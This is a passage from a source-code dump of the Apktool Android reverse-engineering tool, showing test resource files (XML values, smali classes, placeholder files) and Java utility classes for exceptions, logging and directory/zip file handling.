    <attr name="default_value" format="float" />
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values/colors.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <color name="test_color1">#123</color>
    <color name="test_color2">#abcd</color>
    <color name="test_color3">#c1ac1a</color>
    <color name="test_color4">#ff123456</color>
    <color name="test_color5">#00000000</color>
    <color name="test_color6">@android:color/white</color>
    <item type="color" name="issue_3416" format="string">\@null</item>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values/integers.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <integer name="test_integer1">-1</integer>
    <integer name="test_integer2">0</integer>
    <integer name="test_integer3">1</integer>
    <integer name="reference_test">0</integer>
    <integer name="issue_1223_1">700</integer>
    <integer name="issue_1223_2">@integer/issue_1223_1</integer>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values/overlayable.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <overlayable name="OverlayableResources1">
        <policy type="public">
            <item type="string" name="app_name" />
        </policy>
    </overlayable>
    <overlayable name="OverlayableResources2" actor="overlay://theme">
        <policy type="system">
            <item type="color" name="test_color1" />
        </policy>
    </overlayable>
    <overlayable name="OverlayableResources3">
        <policy type="product|signature">
            <item type="drawable" name="test_drawable1" />
        </policy>
    </overlayable>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values/public.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <public type="string" name="hello_world" id="0x7f020000" />
    <public type="xml" name="ww_box_styles_schema" id="0x7f1500df" />
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">testapp</string>
    <string name="test1" />
    <string name="hello_world">Hello World</string>
    <string name="long_string1" />
    <string name="long_string2" />
    <string name="long_string3" />
    <string name="long_string_32767" />
    <string name="surrogate_issue_2299">🔆</string>
    <string name="html_string_issue_2632"><ul> <li><b>aaaaa aa aaaaa</b> – aaaaaaa aaaaaaaaaa aa aaaaaaaa aaaaaa aaaaa (aaaa) aaaa aaaaaaaaa aaaaa aa aaaaaaaaa aaaaaaa aaaa</li> <li><b>aaaaaaaaa aaaaaaaaaaaaaaa aaaaaaaa</b> – aaaaaaa aaaaaaaaaa aaaaaaaaa aaaa aaaaaa aa aaaa aaaa aaaa aaaa aaaaaaa aaaaaaaaaaaaa, aaaaaa aaa aaaaaaaaaa (aaa) aaaaaaaaaaaaaaa</li> <li><b>aaaaaaaaaaa aaaaaa aaaaaaaaaa</b> – aaaaaaaaaa aaaa aaaaaa aa a aaa aa aaaaaa aaa aaaaaaa (aaaaa aaaaaaaa) aaaaaaaa aa aaaaaa aaaaa aaa aaaa</li> </ul></string>
    <string name="styled_string_issue_2815">Quickly zoom in on the screen to display content more clearly.<br/><br/> <b>To zoom in:</b><br/> 1. Use shortcut to start magnification<br/> 2. Tap the screen<br/> 3. Drag 2 fingers to move around screen<br/> 4. Pinch with 2 fingers to adjust zoom<br/> 5. Use shortcut to stop magnification<br/><br/> <b>To zoom in temporarily:</b><br/> 1. Use shortcut to start magnification<br/> 2. Touch &amp; hold anywhere on the screen<br/> 3. Drag finger to move around screen<br/> 4. Lift finger to stop magnification</string>
    <string name="test_formatting1" />
    <string name="test_formatting2" />
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/xml/accessibility_service_config.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:isAccessibilityTool="true"
/>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/xml/literals.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<x xmlns:android="http://schemas.android.com/apk/res/android">
    <basic
        b01=""
        b02="Lorem ipsum"
        b03="'"
        b04="&quot;"
        b05="&amp;"
        b06="&lt;"
        b07=">"
        b08="]>"
        b09="]]&gt;"
        b10="\n"
        b11="\t"
        b12="\u000d"
        b13=" foo  bar   "
        b14="foo \n bar"
    />
    <numeric
        n01="0"
        n02="\0"
        n03="0.0"
        n04="\0.0"
        n05="1"
        n06="\1"
        n07="1.0"
        n08="\1.0"
        n09="0x1234"
        n10="\0x1234"
        n11="-4660"
        n12="\-0x1234"
        n13="214748000.0"
        n14="\2.147480e+08"
        n15="-1858.0"
        n16="\-0x3a.1p+5"
        n17="2147483648.0"
        n18="\2.147484e+09"
        n19="0x80000000"
        n20="\0x80000000"
        n21="-2147483648"
        n22="\-2147483648"
        n23="\-0x80000000"
        n24="0xffffffff"
        n25="\0xffffffff"
    />
    <color
        c01="#"
        c02="#1"
        c03="#12"
        c04="#123"
        c05="\#123"
        c06="#f123"
        c07="\#f123"
        c08="#123456"
        c09="\#123456"
        c10="#ff123456"
        c11="\#ff123456"
    />
    <reference
        r01="@"
        r02="@null"
        r03="\@null"
        r04="@empty"
        r05="\@empty"
        r06="\@string/fake1"
        r07="\@invalid/fake2"
        r08="?"
        r09="\?fake1"
        r10="\?attr/fake2"
        r11="\?invalid/fake3"
    />
    <url>http://www.foo.com/?param1=value1&amp;param2=value2</url>
    <html>&lt;font size=16 align=middle>Small&lt;/font></html>
    <cdata>&lt;![CDATA[foo]]&gt;</cdata>
</x>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/xml/references.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<x xmlns:android="http://schemas.android.com/apk/res/android"
    test1="@string/test1"
    test2="@android:string/ok"
    test3="?android:textStyle"
/>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/xml/ww_box_styles_schema.xsd`:

```xsd
<?xml version="1.0" encoding="utf-8"?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
    <xs:element name="test">
        <xs:complexType>
            <xs:sequence>
                <xs:element name="person" type="xs:string"/>
                <xs:element name="address">
                    <xs:complexType>
                        <xs:sequence>
                            <xs:element name="name" type="xs:string"/>
                            <xs:element name="address" type="xs:string"/>
                            <xs:element name="city" type="xs:string"/>
                            <xs:element name="country" type="xs:string"/>
                        </xs:sequence>
                    </xs:complexType>
                </xs:element>
            </xs:sequence>
        </xs:complexType>
    </xs:element>
</xs:schema>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/smali/HelloWorld.smali`:

```smali
.class public LHelloWorld;

.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method
```

`brut.apktool/apktool-lib/src/test/resources/testapp/smali/MainActivity.smali`:

```smali
.class public LMainActivity;
.super Landroid/app/Activity;

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2

    .prologue
    const/4 v0, 0x1

    .line 8
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 10
    new-instance v1, Landroid/widget/TextView;

    invoke-direct {v1, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 11
    const-string v0, "Hello, World!"

    invoke-virtual {v1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 12
    invoke-virtual {p0, v1}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V

    .line 13
    return-void
.end method

```

`brut.apktool/apktool-lib/src/test/resources/testapp/smali_classes2/HelloDualDexSupport.smali`:

```smali
.class public LHelloDualDexSupport;

.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method
```

`brut.apktool/apktool-lib/src/test/resources/testapp/smali_classes3/HelloTripleDexSupport.smali`:

```smali
.class public LHelloTripleDexSupport;

.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method
```

`brut.apktool/apktool-lib/src/test/resources/testapp/unknown/AssetBundle/assets/a.txt`:

```txt
issue-3038

```

`brut.apktool/apktool-lib/src/test/resources/testapp/unknown/AssetBundle/b.txt`:

```txt
issue-3038

```

`brut.apktool/apktool-lib/src/test/resources/testapp/unknown/hidden.file`:

```file
This file is unknown.
```

`brut.apktool/apktool-lib/src/test/resources/testapp/unknown/lib_bug603/bug603`:

```
https://code.google.com/p/android-apktool/issues/detail?id=603
```

`brut.apktool/apktool-lib/src/test/resources/testapp/unknown/nonprintable.file`:

```file
This file's name contains a non-printable character.
```

`brut.apktool/apktool-lib/src/test/resources/testapp/unknown/stored.file`:

```file
This file is not compressed.
```

`brut.apktool/apktool-lib/src/test/resources/testapp/unknown/unk_folder/unknown_file`:

```
I am a hidden file. Put here by a developer to make recompilation difficult.
```

`brut.apktool/apktool-lib/src/test/resources/testjar/apktool.yml`:

```yml
version: 2.0.0
apkFileName: testjar.jar
```

`brut.apktool/apktool-lib/src/test/resources/testjar/original/META-INF/MANIFEST.MF`:

```MF
Manifest-Version: 1.0
Created-By: 1.6.0_45 (Sun Microsystems Inc.)


```

`brut.apktool/apktool-lib/src/test/resources/testjar/smali/com/apktool/test/Test.smali`:

```smali
.class public LTest;

.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method

```

`brut.apktool/apktool-lib/src/test/resources/util/traversal/file`:

```
file
```

`brut.j.common/src/main/java/brut/common/BrutException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.common;

public class BrutException extends Exception {

    public BrutException() {
        super();
    }

    public BrutException(String message) {
        super(message);
    }

    public BrutException(Throwable cause) {
        super(cause);
    }

    public BrutException(String message, Throwable cause) {
        super(message, cause);
    }
}

```

`brut.j.common/src/main/java/brut/common/Log.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.common;

import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentMap;
import java.util.logging.Level;
import java.util.logging.Logger;

public final class Log {
    private static final ConcurrentMap<String, Logger> sCache = new ConcurrentHashMap<>();

    private Log() {
        // Private constructor for utility class.
    }

    private static void log(Level level, String tag, String message) {
        Logger logger = sCache.computeIfAbsent(tag, Logger::getLogger);
        if (logger.isLoggable(level)) {
            logger.log(level, message);
        }
    }

    private static void log(Level level, String tag, String message, Object... args) {
        Logger logger = sCache.computeIfAbsent(tag, Logger::getLogger);
        if (logger.isLoggable(level)) {
            logger.log(level, String.format(message, args));
        }
    }

    public static void d(String tag, String message) {
        log(Level.FINE, tag, message);
    }

    public static void d(String tag, String message, Object... args) {
        log(Level.FINE, tag, message, args);
    }

    public static void i(String tag, String message) {
        log(Level.INFO, tag, message);
    }

    public static void i(String tag, String message, Object... args) {
        log(Level.INFO, tag, message, args);
    }

    public static void w(String tag, String message) {
        log(Level.WARNING, tag, message);
    }

    public static void w(String tag, String message, Object... args) {
        log(Level.WARNING, tag, message, args);
    }

    public static void e(String tag, String message) {
        log(Level.SEVERE, tag, message);
    }

    public static void e(String tag, String message, Object... args) {
        log(Level.SEVERE, tag, message, args);
    }
}

```

`brut.j.common/src/templates/apache2.0-header.txt`:

```txt
 Copyright (C) ${year} ${brut} <${brutEmail}>
 Copyright (C) ${year} ${ibot} <${ibotEmail}>

 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at

      https://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.


```

`brut.j.dir/build.gradle.kts`:

```kts
dependencies {
    implementation(project(":brut.j.common"))
    implementation(project(":brut.j.util"))
}

```

`brut.j.dir/src/main/java/brut/directory/Directory.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

import brut.common.Log;
import brut.util.BrutIO;
import brut.util.OS;

import java.io.File;
import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.InvalidPathException;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.Map;
import java.util.Set;

public abstract class Directory implements AutoCloseable {
    private static final String TAG = "";

    public final String separator = "/";
    public final char separatorChar = '/';

    protected Set<String> mFiles;
    protected Set<String> mFilesRecursive;
    protected Map<String, Directory> mDirs;

    protected abstract void load();

    protected InputStream getFileInputImpl(String name) throws DirectoryException {
        throw new UnsupportedOperationException();
    }

    protected OutputStream getFileOutputImpl(String name) throws DirectoryException {
        throw new UnsupportedOperationException();
    }

    protected void removeFileImpl(String name) {
        throw new UnsupportedOperationException();
    }

    protected Directory createDirImpl(String name) throws DirectoryException {
        throw new UnsupportedOperationException();
    }

    public long getSize(String name) throws DirectoryException {
        throw new UnsupportedOperationException();
    }

    public long getCompressedSize(String name) throws DirectoryException {
        throw new UnsupportedOperationException();
    }

    public int getCompressionLevel(String name) throws DirectoryException {
        throw new UnsupportedOperationException();
    }

    @Override
    public void close() throws DirectoryException {
        // Stub.
    }

    public Set<String> getFiles() {
        return getFiles(false);
    }

    public Set<String> getFiles(boolean recursive) {
        if (mFiles == null) {
            load();
        }
        if (!recursive) {
            return mFiles;
        }

        if (mFilesRecursive == null) {
            mFilesRecursive = new LinkedHashSet<>(mFiles);
            for (Map.Entry<String, ? extends Directory> dir : getDirs().entrySet()) {
                for (String path : dir.getValue().getFiles(true)) {
                    mFilesRecursive.add(dir.getKey() + separator + path);
                }
            }
        }
        return mFilesRecursive;
    }

    public Map<String, Directory> getDirs() {
        return getDirs(false);
    }

    public Map<String, Directory> getDirs(boolean recursive) {
        if (mDirs == null) {
            load();
        }
        if (!recursive) {
            return mDirs;
        }

        Map<String, Directory> dirs = new LinkedHashMap<>(mDirs);
        for (Map.Entry<String, Directory> dir : mDirs.entrySet()) {
            for (Map.Entry<String, Directory> subdir : dir.getValue().getDirs(true).entrySet()) {
                dirs.put(dir.getKey() + separator + subdir.getKey(), subdir.getValue());
            }
        }
        return dirs;
    }

    public boolean containsFile(String path) {
        SubPath subpath;
        try {
            subpath = getSubPath(path);
        } catch (PathNotExist ignored) {
            return false;
        }

        if (subpath.dir != null) {
            return subpath.dir.containsFile(subpath.path);
        }
        return getFiles().contains(subpath.path);
    }

    public boolean containsDir(String path) {
        SubPath subpath;
        try {
            subpath = getSubPath(path);
        } catch (PathNotExist ignored) {
            return false;
        }

        if (subpath.dir != null) {
            return subpath.dir.containsDir(subpath.path);
        }
        return getDirs().containsKey(subpath.path);
    }

    public InputStream getFileInput(String path) throws DirectoryException {
        SubPath subpath = getSubPath(path);
        if (subpath.dir != null) {
            return subpath.dir.getFileInput(subpath.path);
        }

        if (!getFiles().contains(subpath.path)) {
            throw new PathNotExist(path);
        }
        return getFileInputImpl(subpath.path);
    }

    public OutputStream getFileOutput(String path) throws DirectoryException {
        ParsedPath parsed = parsePath(path);
        if (parsed.dir == null) {
            getFiles().add(parsed.subpath);
            return getFileOutputImpl(parsed.subpath);
        }

        Directory dir;
        try {
            dir = createDir(parsed.dir);
        } catch (PathAlreadyExists ignored) {
            dir = getDirs().get(parsed.dir);
        }
        return dir.getFileOutput(parsed.subpath);
    }

    public boolean removeFile(String path) {
        SubPath subpath;
        try {
            subpath = getSubPath(path);
        } catch (PathNotExist ignored) {
            return false;
        }

        if (subpath.dir != null) {
            return subpath.dir.removeFile(subpath.path);
        }
        if (!getFiles().contains(subpath.path)) {
            return false;
        }
        removeFileImpl(subpath.path);
        getFiles().remove(subpath.path);
        return true;
    }

    public Directory getDir(String path) throws PathNotExist {
        SubPath subpath = getSubPath(path);
        if (subpath.dir != null) {
            return subpath.dir.getDir(subpath.path);
        }
        if (!getDirs().containsKey(subpath.path)) {
            throw new PathNotExist(path);
        }
        return getDirs().get(subpath.path);
    }

    public Directory createDir(String path) throws DirectoryException {
        ParsedPath parsed = parsePath(path);
        Directory dir;
        if (parsed.dir == null) {
            if (getDirs().containsKey(parsed.subpath)) {
                throw new PathAlreadyExists(path);
            }
            dir = createDirImpl(parsed.subpath);
            getDirs().put(parsed.subpath, dir);
            return dir;
        }

        if (getDirs().containsKey(parsed.dir)) {
            dir = getDirs().get(parsed.dir);
        } else {
            dir = createDirImpl(parsed.dir);
            getDirs().put(parsed.dir, dir);
        }
        return dir.createDir(parsed.subpath);
    }

    public void copyToDir(Directory out) throws DirectoryException {
        for (String fileName : getFiles(true)) {
            copyToDir(out, fileName);
        }
    }

    public void copyToDir(Directory out, String fileName) throws DirectoryException {
        copyToDir(fileName, out, fileName);
    }

    public void copyToDir(Directory out, String... fileNames) throws DirectoryException {
        for (String fileName : fileNames) {
            copyToDir(out, fileName);
        }
    }

    public void copyToDir(String inFileName, Directory out, String outFileName) throws DirectoryException {
        try {
            if (containsDir(inFileName)) {
                getDir(inFileName).copyToDir(out.createDir(outFileName));
            } else {
                BrutIO.copyAndClose(getFileInput(inFileName), out.getFileOutput(outFileName));
            }
        } catch (IOException ex) {
            throw new DirectoryException("Error copying file: " + inFileName, ex);
        }
    }

    public void copyToDir(File out) throws DirectoryException {
        for (String fileName : getFiles(true)) {
            copyToDir(out, fileName);
        }
    }

    public void copyToDir(File out, String fileName) throws DirectoryException {
        copyToDir(fileName, out, fileName);
    }

    public void copyToDir(File out, String... fileNames) throws DirectoryException {
        for (String fileName : fileNames) {
            copyToDir(out, fileName);
        }
    }

    public void copyToDir(String inFileName, File out, String outFileName) throws DirectoryException {
        try {
            if (containsDir(inFileName)) {
                File outDir = new File(out, outFileName);
                getDir(inFileName).copyToDir(outDir);
            } else if (containsFile(inFileName)) {
                outFileName = BrutIO.sanitizePath(out, outFileName);
                if (outFileName.isEmpty()) {
                    return;
                }
                File outFile = new File(out, outFileName);
                if (outFile.exists()) {
                    OS.rmfile(outFile);
                } else {
                    File parentDir = outFile.getParentFile();
                    if (parentDir != null) {
                        OS.mkdir(parentDir);
                    }
                }
                BrutIO.copyAndClose(getFileInput(inFileName), Files.newOutputStream(outFile.toPath()));
            } else {
                // Do nothing if directory/file not found.
                return;
            }
        } catch (InvalidPathException ex) {
            Log.w(TAG, "Skipping file %s (%s)", inFileName, ex.getMessage());
        } catch (IOException ex) {
            throw new DirectoryException("Error copying file: " + inFileName, ex);
        }
    }

    private SubPath getSubPath(String path) throws PathNotExist {
        ParsedPath parsed = parsePath(path);
        if (parsed.dir == null) {
            return new SubPath(null, parsed.subpath);
        }
        if (!getDirs().containsKey(parsed.dir)) {
            throw new PathNotExist(path);
        }
        return new SubPath(getDirs().get(parsed.dir), parsed.subpath);
    }

    private ParsedPath parsePath(String path) {
        int pos = path.indexOf(separatorChar);
        if (pos == -1) {
            return new ParsedPath(null, path);
        }
        return new ParsedPath(path.substring(0, pos), path.substring(pos + 1));
    }

    private static class ParsedPath {
        public final String dir;
        public final String subpath;

        public ParsedPath(String dir, String subpath) {
            this.dir = dir;
            this.subpath = subpath;
        }
    }

    private static class SubPath {
        public final Directory dir;
        public final String path;

        public SubPath(Directory dir, String path) {
            this.dir = dir;
            this.path = path;
        }
    }
}

```

`brut.j.dir/src/main/java/brut/directory/DirectoryException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

import brut.common.BrutException;

public class DirectoryException extends BrutException {
    private static final long serialVersionUID = -8871963042836625387L;

    public DirectoryException() {
        super();
    }

    public DirectoryException(String message) {
        super(message);
    }

    public DirectoryException(Throwable cause) {
        super(cause);
    }

    public DirectoryException(String message, Throwable cause) {
        super(message, cause);
    }
}

```

`brut.j.dir/src/main/java/brut/directory/ExtFile.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

import java.io.File;
import java.net.URI;

public class ExtFile extends File implements AutoCloseable {
    private Directory mDirectory;

    public ExtFile(File file) {
        super(file.getPath());
    }

    public ExtFile(URI uri) {
        super(uri);
    }

    public ExtFile(File parent, String child) {
        super(parent, child);
    }

    public ExtFile(String parent, String child) {
        super(parent, child);
    }

    public ExtFile(String pathname) {
        super(pathname);
    }

    public Directory getDirectory() throws DirectoryException {
        if (mDirectory == null) {
            if (isDirectory()) {
                mDirectory = new FileDirectory(this);
            } else {
                mDirectory = new ZipRODirectory(this);
            }
        }
        return mDirectory;
    }

    @Override
    public void close() throws DirectoryException {
        if (mDirectory != null) {
            mDirectory.close();
            mDirectory = null;
        }
    }

    @Override
    public boolean delete() {
        try {
            close();
        } catch (DirectoryException ignored) {
            return false;
        }

        return super.delete();
    }
}

```

`brut.j.dir/src/main/java/brut/directory/FileDirectory.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

import brut.util.OS;

import java.io.File;
import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.Files;
import java.util.Arrays;
import java.util.Comparator;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;

public class FileDirectory extends Directory {
    private final File mDir;

    public FileDirectory(String dirName) throws DirectoryException {
        this(new File(dirName));
    }

    public FileDirectory(File dir) throws DirectoryException {
        if (!dir.isDirectory()) {
            throw new DirectoryException("file must be a directory: " + dir);
        }
        mDir = dir;
    }

    @Override
    protected void load() {
        mFiles = new LinkedHashSet<>();
        mDirs = new LinkedHashMap<>();

        File[] files = mDir.listFiles();
        Arrays.sort(files, Comparator.comparing(File::getName));

        for (File file : files) {
            if (file.isFile()) {
                mFiles.add(file.getName());
            } else {
                try {
                    mDirs.put(file.getName(), new FileDirectory(file));
                } catch (DirectoryException ignored) {
                }
            }
        }
    }

    private String generatePath(String name) {
        return mDir.getPath() + separator + name;
    }

    @Override
    protected InputStream getFileInputImpl(String name) throws DirectoryException {
        try {
            File file = new File(generatePath(name));
            return Files.newInputStream(file.toPath());
        } catch (IOException ex) {
            throw new DirectoryException(ex);
        }
    }

    @Override
    protected OutputStream getFileOutputImpl(String name) throws DirectoryException {
        try {
            File file = new File(generatePath(name));
            return Files.newOutputStream(file.toPath());
        } catch (IOException ex) {
            throw new DirectoryException(ex);
        }
    }

    @Override
    protected void removeFileImpl(String name) {
        File file = new File(generatePath(name));
        OS.rmfile(file);
    }

    @Override
    protected Directory createDirImpl(String name) throws DirectoryException {
        File dir = new File(generatePath(name));
        OS.mkdir(dir);
        return new FileDirectory(dir);
    }

    @Override
    public long getSize(String name) throws DirectoryException {
        File file = new File(generatePath(name));
        if (!file.isFile()) {
            throw new DirectoryException("file must be a file: " + file);
        }
        return file.length();
    }

    @Override
    public long getCompressedSize(String name) throws DirectoryException {
        return getSize(name);
    }

    @Override
    public int getCompressionLevel(String name) {
        return 0;
    }
}

```

`brut.j.dir/src/main/java/brut/directory/PathAlreadyExists.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

public class PathAlreadyExists extends DirectoryException {
    private static final long serialVersionUID = 3776428251424428904L;

    public PathAlreadyExists() {
        super();
    }

    public PathAlreadyExists(String message) {
        super(message);
    }

    public PathAlreadyExists(Throwable cause) {
        super(cause);
    }

    public PathAlreadyExists(String message, Throwable cause) {
        super(message, cause);
    }
}

```

`brut.j.dir/src/main/java/brut/directory/PathNotExist.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

public class PathNotExist extends DirectoryException {
    private static final long serialVersionUID = -6949242015506342032L;

    public PathNotExist() {
        super();
    }

    public PathNotExist(String message) {
        super(message);
    }

    public PathNotExist(Throwable cause) {
        super(cause);
    }

    public PathNotExist(String message, Throwable cause) {
        super(message, cause);
    }
}

```

`brut.j.dir/src/main/java/brut/directory/ZipRODirectory.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

import java.io.File;
import java.io.InputStream;
import java.io.IOException;
import java.util.Enumeration;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

public class ZipRODirectory extends Directory {
    private final ZipFile mZipFile;
    private final String mPath;

    public ZipRODirectory(String fileName) throws DirectoryException {
        this(fileName, "");
    }

    public ZipRODirectory(File file) throws DirectoryException {
        this(file, "");
    }

    public ZipRODirectory(String fileName, String path) throws DirectoryException {
        this(new File(fileName), path);
    }

